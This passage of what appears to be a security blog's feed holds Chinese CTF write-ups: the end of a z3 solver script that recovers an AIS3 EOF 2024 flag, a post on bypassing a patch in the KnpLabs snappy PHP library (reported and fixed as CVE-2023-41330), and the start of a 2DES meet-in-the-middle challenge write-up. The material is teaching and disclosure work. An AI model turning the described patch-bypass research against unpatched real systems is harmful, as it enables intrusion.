flag[<span class="number">20</span>]</span><br><span class="line">flag[<span class="number">20</span>] += flag[<span class="number">19</span>] + flag[<span class="number">24</span>]</span><br><span class="line">flag[<span class="number">15</span>] += flag[<span class="number">22</span>] + flag[<span class="number">10</span>]</span><br><span class="line">flag[<span class="number">30</span>] -= flag[<span class="number">33</span>] + flag[<span class="number">8</span>]</span><br><span class="line">flag[<span class="number">1</span>] -= flag[<span class="number">29</span>] + flag[<span class="number">13</span>]</span><br><span class="line">flag[<span class="number">19</span>] += flag[<span class="number">10</span>] + flag[<span class="number">16</span>]</span><br><span class="line">flag[<span class="number">0</span>] += flag[<span class="number">33</span>] + flag[<span class="number">16</span>]</span><br><span class="line">flag[<span class="number">36</span>] += flag[<span class="number">11</span>] + flag[<span class="number">15</span>]</span><br><span class="line">flag[<span class="number">24</span>] += flag[<span class="number">20</span>] + flag[<span class="number">5</span>]</span><br><span class="line">flag[<span class="number">7</span>] += flag[<span class="number">21</span>] + flag[<span class="number">0</span>]</span><br><span class="line">flag[<span class="number">1</span>] += flag[<span class="number">15</span>] + flag[<span class="number">6</span>]</span><br><span class="line">flag[<span class="number">30</span>] -= flag[<span class="number">13</span>] + flag[<span class="number">2</span>]</span><br><span class="line">flag[<span class="number">1</span>] += flag[<span class="number">16</span>] + flag[<span class="number">40</span>]</span><br><span class="line">flag[<span class="number">31</span>] += flag[<span class="number">1</span>] + flag[<span class="number">16</span>]</span><br><span class="line">flag[<span class="number">32</span>] += flag[<span class="number">5</span>] + flag[<span class="number">25</span>]</span><br><span class="line">flag[<span class="number">13</span>] += flag[<span class="number">25</span>] + flag[<span class="number">28</span>]</span><br><span class="line">flag[<span class="number">7</span>] += flag[<span class="number">10</span>] + flag[<span class="number">0</span>]</span><br><span class="line">flag[<span class="number">21</span>] += flag[<span class="number">34</span>] + flag[<span class="number">15</span>]</span><br><span class="line">flag[<span class="number">21</span>] -= flag[<span class="number">13</span>] + flag[<span class="number">42</span>]</span><br><span class="line">flag[<span class="number">18</span>] += flag[<span class="number">29</span>] + flag[<span class="number">15</span>]</span><br><span class="line">flag[<span class="number">4</span>] += flag[<span class="number">7</span>] + flag[<span class="number">25</span>]</span><br><span class="line">flag[<span class="number">0</span>] += flag[<span class="number">28</span>] + flag[<span class="number">31</span>]</span><br><span class="line">flag[<span class="number">2</span>] += flag[<span class="number">34</span>] + flag[<span class="number">25</span>]</span><br><span class="line">flag[<span class="number">13</span>] += flag[<span class="number">26</span>] + flag[<span class="number">8</span>]</span><br><span class="line">flag[<span class="number">41</span>] -= flag[<span class="number">3</span>] + flag[<span class="number">34</span>]</span><br><span class="line">flag[<span class="number">37</span>] += flag[<span class="number">27</span>] + flag[<span class="number">18</span>]</span><br><span class="line">flag[<span class="number">4</span>] += flag[<span class="number">27</span>] + flag[<span class="number">25</span>]</span><br><span class="line">flag[<span class="number">23</span>] += flag[<span class="number">30</span>] + flag[<span class="number">39</span>]</span><br><span class="line">flag[<span class="number">18</span>] += flag[<span class="number">26</span>] + flag[<span class="number">31</span>]</span><br><span class="line">flag[<span class="number">10</span>] -= flag[<span class="number">12</span>] + flag[<span class="number">22</span>]</span><br><span class="line">flag[<span class="number">4</span>] += flag[<span class="number">6</span>] + flag[<span class="number">22</span>]</span><br><span class="line">flag[<span class="number">37</span>] += flag[<span class="number">12</span>] + flag[<span class="number">16</span>]</span><br><span class="line">flag[<span class="number">15</span>] += flag[<span class="number">40</span>] + flag[<span class="number">8</span>]</span><br><span class="line">flag[<span class="number">17</span>] += flag[<span class="number">38</span>] + flag[<span class="number">24</span>]</span><br><span class="line">flag[<span class="number">8</span>] += flag[<span class="number">14</span>] + flag[<span class="number">16</span>]</span><br><span class="line">flag[<span class="number">5</span>] += flag[<span class="number">37</span>] + flag[<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(k_target):</span><br><span class="line">    s.add(flag[i] == c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> s.check() == sat</span><br><span class="line">m = s.model()</span><br><span class="line">flag = <span class="built_in">bytes</span>([m[x].as_long() <span class="keyword">for</span> x <span class="keyword">in</span> flag_init]).decode()</span><br><span class="line"><span class="built_in">print</span>(flag) <span class="comment"># AIS3{4re_Y0u_@_sTAtEfUl_OR_S7@TeL3Ss_Ctf3R}</span></span><br></pre></td></tr></table></figure></div>]]></content>
    
    
    <summary type="html">AIS3 EOF 2024 Write-up</summary>
    
    
    
    <category term="AIS3" scheme="https://blog.ching367436.me/categories/AIS3/"/>
    
    <category term="EOF" scheme="https://blog.ching367436.me/categories/AIS3/EOF/"/>
    
    
    <category term="ais3" scheme="https://blog.ching367436.me/tags/ais3/"/>
    
    <category term="ctf" scheme="https://blog.ching367436.me/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>AIS3 2023 最佳專題</title>
    <link href="https://blog.ching367436.me/ais3-2023-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/"/>
    <id>https://blog.ching367436.me/ais3-2023-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/</id>
    <published>2023-10-05T04:02:01.000Z</published>
    <updated>2023-10-05T04:02:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>今年在 AIS3 2023 研究了一些與 PHP HTML to PDF 相關的 library 的漏洞，主要是找到可觸發反序列化的點。透過研究過去已經修復好的洞，我們透過繞過他的 patch，讓 1day 再次變為 Github CVSS 9.8 的 0day，回報給作者後也完成修補，也順便在路上撿到一個有趣的 DoS 的洞。</p><p>對於今年我在這場專題做到最重要的事，就是帶著我沒有任何白箱經驗的隊友們，一起來 code review，透過一些指導，讓他們有了白箱的能力，找到了 0day。這是我自去年 AIS3 以來一直想做的事，拿到最佳專題及一些 0day 就是這次計畫成功的證明。</p><h2 id="專題"><a href="#專題" class="headerlink" title="專題"></a>專題</h2><p>之後有空的時候來寫，先放上<a class="link" href="https://drive.google.com/file/d/1PR6zijgUOUHNQBjalMh3T29zoKsn4ewE/view?usp=drive_link">簡報 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><h2 id="後續"><a href="#後續" class="headerlink" title="後續"></a>後續</h2><p>在 AIS3 2023 結束後，我把我們繞過 CVE-2023-28115 的 patch 的漏洞報告寄給了作者，在一個多月後取得了回信。</p><p><img src="/ais3-2023-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/report-mail.png" alt="image-20231005123453900"></p><p>大約兩天後，他們<a class="link" href="https://github.com/KnpLabs/snappy/pull/488">修復 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>了這個洞，發布了 <a class="link" href="https://github.com/KnpLabs/snappy/security/advisories/GHSA-92rv-4j2h-8mjj">security advisory <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，漏洞編號 CVE-2023-41330，Github CVSS 9.8。</p><p>他的修補方式與我建議的相同，對於使用者提供的 <code>$filename</code> 的 scheme，採用白名單機制過濾而非原先的黑名單機制，這樣可讓攻擊者受到很大的限制。然而這樣修卻衍生出了<a class="link" href="https://github.com/KnpLabs/snappy/issues/489">新的問題 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/Knp/Snappy/AbstractGenerator.php:626</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">prepareOutput</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$overwrite</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$parsedFilename</span> = \<span class="title function_ invoke__">parse_url</span>(<span class="variable">$filename</span>)) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">'The output filename is invalid.'</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="variable">$scheme</span> = <span class="keyword">isset</span>(<span class="variable">$parsedFilename</span>[<span class="string">'scheme'</span>]) ? \<span class="title function_ invoke__">mb_strtolower</span>(<span class="variable">$parsedFilename</span>[<span class="string">'scheme'</span>]) : <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$scheme</span> !== <span class="string">''</span> &amp;&amp; <span class="variable">$scheme</span> !== <span class="string">'file'</span>) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(\<span class="title function_ invoke__">sprintf</span>(<span class="string">'The output file scheme is not supported. Expected \'\' or \'file\' but got \'%s\'.'</span>, <span class="variable">$scheme</span>));</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fileExists</span>(<span class="variable">$filename</span>)) {</span><br><span class="line">          <span class="comment">// [...]</span></span><br><span class="line">        }</span><br><span class="line">      <span class="comment">// [...]</span></span><br><span class="line">    }</span><br></pre></td></tr></table></figure></div><h3 id="修補後的問題"><a href="#修補後的問題" class="headerlink" title="修補後的問題"></a>修補後的問題</h3><p>因為修補的方式採用白名單，連正常的使用也受到影響，他們現在只允許 scheme 是 <code>file</code> 或 空，採用判斷 scheme 是使用 PHP 的 <code>parse_url</code>，但在 Windows 底下的 drive-letter 也會被認定 scheme，所以也會被擋下來。</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="title function_ invoke__">parse_url</span>(<span class="string">'c:\your\path\...'</span>)</span><br><span class="line">= [</span><br><span class="line">    <span class="string">"scheme"</span> =&gt; <span class="string">"c"</span>,</span><br><span class="line">    <span class="string">"path"</span> =&gt; <span class="string">"\your\path\..."</span>,</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure></div><p>過了幾天之後，作者放上了這個問題的<a class="link" href="https://github.com/KnpLabs/snappy/releases/tag/v1.4.4">修補 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。在作業系統是 Windows 的情況下，一個 ascii_letter 的 scheme 且檔名符合 <code>WINDOWS_LOCAL_FILENAME_REGEX</code> 也會被白名單允許。</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/Knp/Snappy/AbstractGenerator.php:24</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractGenerator</span> <span class="keyword">implements</span> <span class="title">GeneratorInterface</span>, <span class="title">LoggerAwareInterface</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">use</span> <span class="title">LoggerAwareTrait</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">const</span> <span class="variable constant_">ALLOWED_PROTOCOLS</span> = [<span class="string">'file'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">const</span> <span class="variable constant_">WINDOWS_LOCAL_FILENAME_REGEX</span> = <span class="string">'/^[a-z]:(?:[\\\\\/]?(?:[\w\s!#()-]+|[\.]{1,2})+)*[\\\\\/]?/i'</span>;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="comment">// :626</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">prepareOutput</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$overwrite</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isProtocolAllowed</span>(<span class="variable">$filename</span>)) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(\<span class="title function_ invoke__">sprintf</span>(<span class="string">'The output file scheme is not supported. Expected one of [\'%s\'].'</span>, \<span class="title function_ invoke__">implode</span>(<span class="string">'\', \''</span>, <span class="built_in">self</span>::<span class="variable constant_">ALLOWED_PROTOCOLS</span>)));</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="comment">// :662</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">isProtocolAllowed</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$parsedFilename</span> = \<span class="title function_ invoke__">parse_url</span>(<span class="variable">$filename</span>)) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">'The filename is not valid.'</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="variable">$protocol</span> = <span class="keyword">isset</span>(<span class="variable">$parsedFilename</span>[<span class="string">'scheme'</span>]) ? \<span class="title function_ invoke__">mb_strtolower</span>(<span class="variable">$parsedFilename</span>[<span class="string">'scheme'</span>]) : <span class="string">'file'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            \PHP_OS_FAMILY === <span class="string">'Windows'</span></span><br><span class="line">            &amp;&amp; \<span class="title function_ invoke__">strlen</span>(<span class="variable">$protocol</span>) === <span class="number">1</span></span><br><span class="line">            &amp;&amp; \<span class="title function_ invoke__">preg_match</span>(<span class="built_in">self</span>::<span class="variable constant_">WINDOWS_LOCAL_FILENAME_REGEX</span>, <span class="variable">$filename</span>)</span><br><span class="line">        ) {</span><br><span class="line">            <span class="variable">$protocol</span> = <span class="string">'file'</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> \<span class="title function_ invoke__">in_array</span>(<span class="variable">$protocol</span>, <span class="built_in">self</span>::<span class="variable constant_">ALLOWED_PROTOCOLS</span>, <span class="literal">true</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h4 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h4><p>2023/08/03: 回報漏洞給作者。</p><p>2023/09/05: 作者回信說正在 working on it。</p><p>2023/09/06: 釋出 <a class="link" href="https://github.com/KnpLabs/snappy/releases/tag/v1.4.3">v1.4.3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，修補好這個漏洞。</p><p>2023/09/13: 釋出 <a class="link" href="https://github.com/KnpLabs/snappy/releases/tag/v1.4.4">v1.4.4 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，修好修補漏洞造成 Windows drive-letter 無法正常使用的問題。</p>]]></content>
    
    
    <summary type="html">今年在 AIS3 2023 研究了一些與 PHP HTML to PDF 相關的 library 的漏洞，主要是找到可觸發反序列化的點。透過研究過去已經修復好的洞，我們透過繞過他的 patch，讓 1day 再次變為 Github CVSS 9.8 的 0day，回報給作者後也完成修補，也順便在路上撿到一個有趣的 DoS 的洞。</summary>
    
    
    
    <category term="AIS3" scheme="https://blog.ching367436.me/categories/AIS3/"/>
    
    <category term="最佳專題" scheme="https://blog.ching367436.me/categories/AIS3/%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/"/>
    
    
    <category term="ais3" scheme="https://blog.ching367436.me/tags/ais3/"/>
    
    <category term="php" scheme="https://blog.ching367436.me/tags/php/"/>
    
    <category term="html2pdf" scheme="https://blog.ching367436.me/tags/html2pdf/"/>
    
    <category term="deserialize" scheme="https://blog.ching367436.me/tags/deserialize/"/>
    
  </entry>
  
  <entry>
    <title>AIS3 Pre-exam 2023 Write-up</title>
    <link href="https://blog.ching367436.me/ais3-pre-exam-2023-write-up/"/>
    <id>https://blog.ching367436.me/ais3-pre-exam-2023-write-up/</id>
    <published>2023-06-06T07:44:47.000Z</published>
    <updated>2023-06-06T07:44:47.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="我出的題目"><a href="#我出的題目" class="headerlink" title="我出的題目"></a>我出的題目</h2><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="2DES"><a href="#2DES" class="headerlink" title="2DES"></a>2DES</h4><p><a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2023/crypto/2des/src">題目連結 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><ul><li>解題人數<ul><li>MyFirstCTF: 1 / 111 (score &gt;= 100)</li><li>Pre-exam: 21 / 256 (score &gt;= 100)</li></ul></li></ul><p>這題考的 Meet-in-the-Middle attack，相信直接搜尋 <code>2DES</code> 就可以知道解題方向。為了怕題目太無聊，所以還加入了需要知道 DES 的一些性質的考點（不知道這個還是解的了）。</p><h5 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h5><p>首先題目會隨機生成 <code>key1</code> <code>key2</code>，其中每個 byte 的前 4 個 bits 都被固定成 <code>1</code>。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Generate key and IV</span></span><br><span class="line"><span class="keyword">const</span> key1 = crypto.<span class="title function_">randomBytes</span>(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">const</span> key2 = crypto.<span class="title function_">randomBytes</span>(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">const</span> iv = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>([<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">'AIS3 三'</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) {</span><br><span class="line">    key1[i] = key1[i] | <span class="number">0b11110000</span></span><br><span class="line">    key2[i] = key2[i] | <span class="number">0b11110000</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><p>接著會把用 <code>key1</code> <code>key2</code> 加密兩層後的 <code>FLAG</code> 以及 <code>hint_pt</code> 印出來，要透過 <code>res</code> <code>hint_pt</code> <code>hint</code> <code>iv</code> 想辦法解出 <code>FLAG</code>。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="title function_">encrypt</span>(<span class="title function_">encrypt</span>(<span class="variable constant_">FLAG</span>, key1, iv), key2, iv)</span><br><span class="line">hint = <span class="title function_">encrypt</span>(<span class="title function_">encrypt</span>(hint_pt, key1, iv), key2, iv)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`let res = '<span class="subst">${res.toString(<span class="string">'hex'</span>)}</span>'`</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`let hint_pt = '<span class="subst">${hint_pt.toString(<span class="string">'hex'</span>)}</span>'`</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`let hint = '<span class="subst">${hint.toString(<span class="string">'hex'</span>)}</span>'`</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`let iv = '<span class="subst">${iv.toString(<span class="string">'hex'</span>)}</span>'`</span>)</span><br></pre></td></tr></table></figure></div><h5 id="題解"><a href="#題解" class="headerlink" title="題解"></a>題解</h5><p>只要取得 <code>key1</code> <code>key2</code> 就可直接解出 <code>FLAG</code>，直接列舉 <code>key1</code> <code>key2</code> 的話會有 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="14.539ex" height="2.09ex" role="img" focusable="false" viewBox="0 -841.7 6426.3 923.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1512.3,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(2512.6,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(4080.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(5136.2,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 種可能，所以是不可行的。</p><h6 id="Meet-in-the-Middle"><a href="#Meet-in-the-Middle" class="headerlink" title="Meet-in-the-Middle"></a>Meet-in-the-Middle</h6><p>這邊可以利用 meet-in-the-middle attack 幫我們把時間複雜度開個根號，具體如下。</p><p>首先要先知道 <code>encrypt(hint_pt, key1, iv)</code> 與 <code>decrypt(hint, key2, iv)</code> 會是相等的 –（1）。</p><img src="/ais3-pre-exam-2023-write-up/meet-in-the-middle.svg" style="width: 100%;"><p>利用這個特性，我們先列舉出所有可能的 <code>middle=encrypt(hint_pt, key1, iv)</code>（透過列舉 <code>key1</code> 來達成），需花費 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 